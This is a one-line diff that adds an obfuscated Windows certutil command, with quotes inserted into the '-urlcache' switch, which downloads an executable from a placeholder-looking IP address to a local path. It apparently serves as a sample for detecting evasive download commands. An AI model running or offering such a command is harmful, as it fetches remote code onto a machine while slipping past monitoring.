@@ -1,0 +1,1 @@
+certutil -url""""cache -split -f http://1.1.1.1/exe Z:\\1.exe
